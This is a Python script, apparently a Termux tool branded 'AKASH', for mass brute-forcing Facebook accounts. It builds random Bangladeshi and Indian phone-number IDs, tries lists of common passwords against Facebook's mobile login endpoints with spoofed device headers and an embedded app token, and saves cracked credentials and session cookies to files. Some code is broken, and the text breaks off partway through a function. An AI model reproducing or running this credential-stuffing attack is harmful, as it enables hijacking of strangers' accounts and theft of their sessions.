#==========[ IMPORT ]========#

try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	#os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python AKASH.py')
	
print(' [•] Join Massanger Group')
os.system('xdg-open https://chat.whatsapp.com/B8pdA0uNxH88NnC38CIgVP')
#==========[ LOPS ]==========#
try:
	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
	open('proxies.txt','w').write(proxies)
except Exception as e:
	print(' [√] LOADING...')
	
proxies=open('proxies.txt','r').read().splitlines()


android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
	for line in xx:
		android_models.append(line)
except:pass

usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass

loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
#==========[ COLURE ]========#
W='\033[1;37m';G='\033[38;5;46m';R='\033[38;5;196m';L='\033[38;5;49m'
#==========[ LINEX ]==========#
def linex():print(f'{G}⋆{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆')
#==========[ CLEAR ]==========#
def clear():
	os.system('clear')
#==========[ LOGO ]==========#
logo=(f"""   {G}Eb    d8 88""Vb     888888 Yb    dP    db    88b 88 \n   {W}88b  d88 88__dP     88__    Yb  dP    dPYb   88Yb88 \n   {W}88YbdP88 88"Yb  .o. 88""     YbdP    dP__Yb  88 Y88  {W}0{R}.{W}0\n   {G}88 YY 88 88  Yb `A' 888888    YP    dP'"'"Yb 88  YN\n{G}⋆{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆\n {R}[{G}√{R}] {W}FACEBOOK {R} >{W} RJ {R}-{W} FARHAN \n {R}[{G}√{R}] {W}OWNER {R}    > {W}AKASH{R} - {W}EVAN\n {R}[{G}√{R}] {W}GITHUB    {R}> {W}X{R}-{W}RAY{R}-{W}404\n{G}⋆{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆\n {R}[{G}√{R}] {W}TOOL{R}-{W}TYPE {R}> {W}RANDOM{R} × {W}FILE\n {R}[{G}√{R}] {W}VERSION   {R}> {W}0.0  {R}>{W}E{R}-{W}V{R}-{W}A{R}-{W}N{R}< \n{G}⋆{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆""")
#========[ APPROVAL ]==========#
#==========[ MENU ]==========#
def AKASH():
	os.system('clear');print(logo)
	print(f' {R}[{G}A{R}]{W} RANDOM CLONE  {W} 2{R}+{W}MENU  ');print(f' {R}[{G}B{R}]{W} FILE CLONE    {W} 1{R}+{W}MENU ');print(f' {R}[{G}C{R}]{W} LIVE CHACK ONE BYE ONE ');print(f' {R}[{G}D{R}]{W} EXIT          {W} {W}PROGRAM ');linex();akash = input(f' {R}[{G}√{R}]{W} CHOICE {R}>{G} ')
	if akash in ['1','A']:
		RNDMNU()
	if akash in ['2','B']:
				os.system('clear');print(logo)
				print(f' {R}[{G}√{R}]{W} EXP {R}>{W}   /sdcard/EVAN.txt  {R}|{W} /sdcard/AKASH.txt ');linex();file = input(f' {R}[{G}√{R}]{W} INPUT FILE NAME {R}>{W} ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print(f' {R}[{G}√{R}]{W} FILE NOT FIND WRONG {R}! ')
					time.sleep(1)
					AKASH()
				os.system('clear');print(logo)
				print(f'{W}	       ALL METHOD WORKING ALL TIME  ');linex();print(f' {R}[{G}A{R}]{W} METHOD  {R}( {W}FOR MIX IDS{R} ) {R} ({W}V1.FAST{R} ) \n {R}[{G}B{R}]{W} METHOD  {R}( {W}FOR MIX IDS{R} )  {R}({W}V1.BEST{R} )  \n {R}[{G}C{R}]{W} METHOD  {R}( {W}WITH COKIES{R} )  {R}({W}V2.FAST {R}) ');linex();mthd=input(f' {R}[{G}√{R}]{W} CHOICE {R}>{W} ');linex()
				plist = []
				try:
					ps_limit = int(input(f' {R}[{G}√{R}]{W} ENTER PASSWORD LIMIT {R}>{W} '))
				except:
					ps_limit =1
				os.system('clear');print(logo)
				print(f' {R}[{G}√{R}]{W} EXP {R}>  {R}|{W} first last  {R}|{W}  firtslast  {R}|{W}  first123');linex();print(f'{W}	           PASSWORD ENTER MENU ');linex()
				for i in range(ps_limit):
					plist.append(input(f' {R}[{G}√{R}]{W} PASSWORD {R}[{W}{i+1}{R}] {R}>{W} '));linex()
				os.system('clear');print(logo)
				print(f' {R}[{G}√{R}]{W} SHOW CP ACCOUNT? {W}({G}Y{W}/{R}N{W}) {R}>{W} ');linex();cx=input(f' {R}[{G}√{R}]{W} CHOICHE {R}>{W} ')
				if cx in ['y','Y','yes','Yes','1']:
					pcp.append('y')
				else:
					pcp.append('n')
				with tred(max_workers=30) as crack_submit:
					os.system('clear');print(logo)
					total_ids = str(len(fo))
					print(f'{W}	      FILE BANGLADESH × INDIA CLONE  ');linex();print(f' {R}[{G}√{R}]{W} TOTAL FILE IDS {G}'+total_ids+f' ');print(f' {R}[{G}√{R}]{W} PROSESS STARTED PLEASE WAITE...');linex()
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						if mthd in ['1','A']:
							crack_submit.submit(api1,ids,names,passlist)
						elif mthd in ['2','B']:
							crack_submit.submit(api2,ids,names,passlist)
						elif mthd in ['3','C']:
							crack_submit.submit(api3,ids,names,passlist)
				print('\033[1;37m');linex();print(f' {R}[{G}√{R}]{W} DONE CLONING ');print(f' {R}[{G}√{R}]{W}  {G}OK{W}/{R}CP{W} > {G}'+str(len(oks))+f'{W}/{R}'+str(len(cps)));linex();input(f' {R}[{G}√{R}]{W} PRESS ENTER TO BACK  ');os.system('python AKASH.py')
	if akash in ['0','D']:linex();exit(f' {R}[{G}√{R}]{W} OK DONE BRO ')
	if akash in ['3','C']:lkck()
	else:AKASH()
#==========[ MNU ]========#
def RNDMNU():
	os.system('clear');print(logo)
	print(f' {R}[{G}A{R}]{W} BANGLADESH RANDOM CLONE \n {R}[{G}B{R}]{W} INDIA RANDOM CLONE ');linex();evan = input(f' {R}[{G}√{R}]{W} CHOICE {R}>{W} ')
	if evan in ['1','A']:BD()
	if evan in ['2','B']:IND()
	else:BD()
#==========[ BD ]==========#
def BD():
		user=[]
		os.system('clear');print(logo)
		print(f' {R}[{G}√{R}]{W} EXP {R}> {R}|{W} 017  {R}|{W}  019  {R}|{W}  018  {R}|{W}  016  ');linex()
		code = input(f' {R}[{G}√{R}]{W} CODE {R}>{W} ')
		try:
			os.system('clear');print(logo)
			print(f' {R}[{G}√{R}]{W} EXP {R}> {R}|{W} 2000 {R}| {W}3000 {R}|{W}  4000  {R}|{W}  5000 ');linex()
			limit = int(input(f' {R}[{G}√{R}]{W} LIMIT {R}>{W} '))
		except ValueError:
			limit = 5000
		os.system('clear');print(logo)
		print(f' {R}[{G}A{R}]{W} METHOD  {R}( {W}FOR MIX IDS{R} ) {R} ({W}V1.FAST{R} ) \n {R}[{G}B{R}]{W} METHOD  {R}( {W}FOR MIX IDS{R} )  {R}({W}V1.BEST{R} )  \n {R}[{G}C{R}]{W} METHOD  {R}( {W}WITH COKIES{R} )  {R}({W}V2.FAST {R}) ')
		linex()
		mthd = input(f' {R}[{G}√{R}]{W} INPUT {R}>{W} ')
		os.system('clear');print(logo)
		print(f' {R}[{G}A{R}]{W} CLONE WITH 7+11 DIGIT PASS {R}[{W} V{R}-{W}FAST{R} ] \n {R}[{G}B{R}]{W} CLONE WITH AUTO PASS       {R}[{W} ONLY{R}-{W}BD{R} ] ');linex()
		pcs = input(f' {R}[{G}√{R}]{W} INPUT {R}>{W} ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(8))
			user.append(nmp)
		with tred(max_workers=30) as AKASH:	
			os.system('clear');print(logo)
			tl = str(len(user))
			print(f'{W}	        RANDOM BANGLADESH CLONE  ');linex()
			print(f' {R}[{G}√{R}]{W} TOTAL UID {R}> {G}'+tl+f' ')
			print(f' {R}[{G}√{R}]{W} CHOICE CODE {R}> {G}'+code)
			print(f' {R}[{G}√{R}]{W} PROSESS STARTED PLEASE WAITE...')
			linex()
			for psx in user:
				ids = code+psx
				if pcs in ['1','A']:
					passlist = [psx,ids,'mehedi','mababa','taniya','sumaiya','saiful','jannatul','Fatema','farjana','sabbir','humaira','alamin','mimmim','aaabbb','hridoy','fariya','shakil','roksana','mafiya','habiba','free fire','shahin','i love you','sadiya','ayesha','nusrat','Bangla','AKASH','gaming','tamanna','jannat','laboni']
				elif pcs in ['2','B']:
					passlist = [psx,ids,ids[2:],ids[:3],'mehedi','mababa','taniya','sumaiya','saiful','jannatul','Fatema','farjana','sabbir','humaira','alamin','mimmim','aaabbb','hridoy','fariya','shakil','roksana','mafiya','habiba','free fire','shahin','i love you','sadiya','ayesha','nusrat','Bangla','AKASH','gaming','tamanna','jannat','laboni']
				if mthd in ['1','A']:
					AKASH.submit(AKASH1,ids,passlist)
				if mthd in ['2','B']:
					AKASH.submit(AKASH2,ids,passlist)
				if mthd in ['3','C']:
					AKASH.submit(AKASH3,ids,passlist)
		print('\033[1;37m')
		linex()
		print(f' {R}[{G}√{R}]{W} DONE CLONING ')
		print(f' {R}[{G}√{R}]{W}  {G}OK{W}/{R}CP{W}>{G} '+str(len(oks))+f'{W}/{G}'+str(len(cps)))
		linex()
		input(f' {R}[{G}√{R}]{W} PRESS ENTER TO BACK  ')
		os.system('python AKASH.py')
#========[ INDIA ]============#
def IND():
		user=[]
		os.system('clear');print(logo)
		print(f' {R}[{G}√{R}]{W} EXP {R}> {R}|{W} +91620  {R}|{W}  +91630  {R}|{W}  +91670  {R}|{W}  +91620  ');linex()
		code = input(f' {R}[{G}√{R}]{W} CODE {R}>{G} ')
		try:
			os.system('clear');print(logo)
			print(f' {R}[{G}√{R}]{W} EXP {R}> {R}|{W} 2000 {R}| {W}3000 {R}|{W}  4000  {R}|{W}  5000 ');linex()
			limit = int(input(f' {R}[{G}√{R}]{W} LIMIT {R}>{G} '))
		except ValueError:
			limit = 5000
		os.system('clear');print(logo)
		print(f' {R}[{G}A{R}]{W} METHOD  {R}( {W}FOR MIX IDS{R} ) {R} ({W}V1.FAST{R} ) \n {R}[{G}B{R}]{W} METHOD  {R}( {W}FOR MIX IDS{R} )  {R}({W}V1.BEST{R} )  \n {R}[{G}C{R}]{W} METHOD  {R}( {W}WITH COKIES{R} )  {R}({W}V2.FAST {R}) ')
		linex()
		mthd = input(f' {R}[{G}√{R}]{W} INPUT {R}>{G} ')
		os.system('clear');print(logo)
		print(f' {R}[{G}A{R}]{W} CLONE WITH 7+11 DIGIT PASS {R}[{W} V{R}-{W}FAST{R} ] \n {R}[{G}B{R}]{W} CLONE WITH AUTO PASS       {R}[{W} ONLY{R}-{W}IN{R} ] ');linex()
		pcs = input(f' {R}[{G}√{R}]{G} INPUT {R}>{W} ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as AKASH:	
			os.system('clear');print(logo)
			tl = str(len(user))
			print(f'{W}	          RANDOM INDIAN CLONE  ');linex()
			print(f' {R}[{G}√{R}]{W} TOTAL UID {R}> {G}'+tl+f' ')
			print(f' {R}[{G}√{R}]{W} CHOICE CODE {R}> {G}'+code)
			print(f' {R}[{G}√{R}]{W} PROSESS STARTED PLEASE WAITE...')
			linex()
			for psx in user:
				ids = code+psx
				if pcs in ['1','A']:
					passlist = [psx,ids[8:],ids[:3],ids[:4],ids[5:],ids[2:],ids,psx+ids,psx+ids[:3],'57273200','59039200','57575751','59493200','10002000']
				elif pcs in ['2','B']:
					passlist = [psx,ids[8:],ids[:3],ids[:4],ids[5:],ids[2:],ids,psx+ids,psx+ids[:3],'57273200','59039200','57575751','59493200','10002000']
				if mthd in ['1','A']:
					AKASH.submit(AKASH1,ids,passlist)
				if mthd in ['2','B']:
					AKASH.submit(AKASH2,ids,passlist)
				if mthd in ['3','C']:
					AKASH.submit(AKASH3,ids,passlist)
		print('\033[1;37m')
		linex()
		print(f' {R}[{G}√{R}]{W} DONE CLONING ')
		print(f' {R}[{G}√{R}]{W}  {G}OK{W}/{R}CP{W}>{G} '+str(len(oks))+f'{W}/{G}'+str(len(cps)))
		linex()
		input(f' {R}[{G}√{R}]{W} PRESS ENTER TO BACK  ')
		os.system('python AKASH.py')
#========[ LOCK-CHACK ]=======#
def lkck():
	os.system("clear");print(logo)
	print(f'     {R}[ {W}INPUT UID EX {R}]  {R}>>  {R}[ {G}100047181300789 {R}]  ')
	linex()
	uid = input(f" {R}[{G}√{R}]{W} INPUT YOUR ID UID {R}>>{G} ")
	linex()
	res = httpx.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
	if res == 'LOCK':
		print(f" {R}[{L}LOCK{R}-{L}ID{R}Ã—]-{G}Ã—{R}]-{R}[ {L}"+uid+f" {R}]{L}-{R}[{L} Facebook User {R}]")
		linex()
	if res =='LIVE':
		print(f" {R}[{G}EVAN{R}-{L}OK{R}-{G}âˆš{R}]{G} "+uid+f" | "+res)
		linex()
	akash =input(f' {R}[{G}âˆš{R}]{L} ENTER TO AGAIN {R}>>' )
	kx()
def kx():
	linex()
	print(f'     {R}[ {W}INPUT UID EX {R}]  {R}>>  {R}[ {G}100047181300789 {R}]  ')
	linex()
	uid = input(f" {R}[{G}âˆš{R}]{W} INPUT YOUR ID UID {R}>>{G} ")
	linex()
	res = httpx.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
	if res == 'LOCK':
		print(f" {R}[{L}LOCK{R}-{L}ID{R}]-{R}[ {L}"+uid+f" {R}]{L}-{R}[{L} Facebook User {R}]")
		linex()
	if res =='LIVE':
		print(f" {R}[{L}EVAN{R}-{L}OK{R}]{G} "+uid+f" | "+res)
		linex()
	akash =input(f' {R}[{G}âˆš{R}]{W} ENTER TO AGAIN {R}>>' )
	kx()
#========[ METHOD-1 ]=========#
def AKASH1(ids,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r {R}({W}AKASH{R}-{G}M1{R}) {W}%s{R}|{G}%s'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua = "Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.0; '+model+' Build/'+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))+' [FBAN/FB4A;FBAV/'+str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))+';FBBV/'+str(random.randint(745000000,745999999))+';FBDM/{density=2.25,width=720,height=1452};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/'+model+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [AKASH-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/AKASH-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/AKASH-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;205m [AKASH-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AKASH-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#==========[ METHOD-2 ]===========#
def AKASH2(ids,passlist):
	global loop
	global oks
	try:
		for pas in passlist:
			sys.stdout.write(f'\r\r {R}({W}AKASH{R}-{G}M2{R}) {W}%s{R}|{G}%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
			application_version_code=str(random.randint(000000000,999999999))
			__iam_genius = random.choice(android_models)
			phone_model = __iam_genius.split('|')[0]
			phone_company = __iam_genius.split('|')[1]
			dimensions = __iam_genius.split('|')[2]
			ffb=random.choice(fbks)
			dvlk = random.choice(usr)
			#1 method issue es ma ha
			ua_string = 'Dalvik/2.1.0 (Linux; U; Android 10; Infinix X690B Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/236.0.0.24.108;FBBV/405428495;FBRV/0;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X690B;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.97,width=720,height=1612};FB_FW/1;]'
			device_family_id = str(uuid.uuid4())
			adid = str(uuid.uuid4())
			machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
			data = {'adid':adid,
				'format':'json',
				'device_id':device_family_id,
				'email':ids,
				'password':pas,
				'generate_analytics_claim':'1',
				'community_id':'','cpl':'true','try_num':'1',
				'family_device_id':device_family_id,
				'credentials_type':'device_based_login_password',
				'generate_session_cookies':'1',
				'error_detail_type':'button_with_disabled',
				'source':'device_based_login',
				'machine_id':machine_id,
				'login_location_accuracy_m':'1.0',
				'meta_inf_fbmeta':'',
				'advertiser_id':adid,
				'encrypted_msisdn':'',
				'currently_logged_in_userid':'0',
				'locale':'en_PK',
				'client_country_code':'PK',
				'method':'auth.login',
				'fb_api_req_friendly_name':'authenticate',
				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
			head = {
				'content-type':'application/x-www-form-urlencoded',
				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-type':'unknown',
				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
				'api_key': '8114af471d039628db5c68cb127af936',
				'user-agent':ua_string,
				'x-fb-net-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
				'x-fb-connection-quality':'EXCELLENT',
				'x-fb-friendly-name':'authenticate',
				'accept-encoding':'gzip, deflate',
				'x-fb-http-engine':	'Liger'}
			url = 'https://b-api.facebook.com/method/auth.login'
			po = requests.post(url,data=data,headers=head,allow_redirects=False).text
			q = json.loads(po)
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [AKASH-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/AKASH-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;205m [AKASH-CP] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/AKASH-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(10)
	except Exception as e:
		pass
#==========[ METHOD-3 ]==========#
def AKASH3(ids,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r {R}({W}AKASH{R}-{G}M3{R}){W} %s|{R}{G}%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=3130};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [AKASH-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/AKASH-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/AKASH-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;205m [AKASH-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AKASH-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#=========[ FILE-METHOD-1 ]==========#
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write(f'\r\r {R}({W}AKASH{R}-{G}M1{R}) {W}%s{R}|{G}%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
				ln = fn
			for pw in passlist:
				pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
				
				application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
				application_version_code=str(random.randint(000000000,999999999))
				__iam_genius = random.choice(android_models)
				phone_model = __iam_genius.split('|')[0]
				phone_company = __iam_genius.split('|')[1]
				dimensions = __iam_genius.split('|')[2]
				ffb=random.choice(fbks)
				dvlk = random.choice(usr)
				ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/{str(application_version)};FBPN/com.facebook.katana;FBLC/en_PK;FBCR/null;FBBV/{str(application_version_code)};FBMF/{str(phone_company)};FBBD/{str(phone_company)};FBDV/{str(phone_company)};FBSV/8.1.0;;FBDM/'+'{density=2.75,height=1440,width=720};]'
				li = ['28','29','210']
				li2 = random.choice(li)
				j1 = ''.join(random.choice(digits) for _ in range(2))
				j2 = li2+j1
				device_family_id = str(uuid.uuid4())
				adid = str(uuid.uuid4())
				machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
				data = {'adid':adid,
				'format':'json',
				'device_id':device_family_id,
				'email':ids,
				'password':pas,
				'generate_analytics_claim':'1',
				'community_id':'','cpl':'true','try_num':'1',
				'family_device_id':device_family_id,
				'credentials_type':'device_based_login_password',
				'generate_session_cookies':'1',
				'error_detail_type':'button_with_disabled',
				'source':'device_based_login',
				'machine_id':machine_id,
				'login_location_accuracy_m':'1.0',
				'meta_inf_fbmeta':'',
				'advertiser_id':adid,
				'encrypted_msisdn':'',
				'currently_logged_in_userid':'0',
				'locale':'en_PK',
				'client_country_code':'PK',
				'method':'auth.login',
				'fb_api_req_friendly_name':'authenticate',
				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
				head = {
				'content-type':'application/x-www-form-urlencoded',
				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-type':'unknown',
				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
				'user-agent':ua_string,
				'x-fb-net-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
				'x-fb-connection-quality':'EXCELLENT',
				'x-fb-friendly-name':'authenticate',
				'accept-encoding':'gzip, deflate',
				'x-fb-http-engine':	'Liger'}
				url = 'https://b-api.facebook.com/method/auth.login'
				po = requests.post(url,data=data,headers=head,allow_redirects=False).text
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [AKASH-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/AKASH-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [AKASH-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/AKASH-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/AKASH-CP.txt','a').write(ids+'|'+pas+'\n')
						break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			time.sleep(10)
		except Exception as e:
			pass
#=========[ FILE-METHOD-2 ]==========#
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
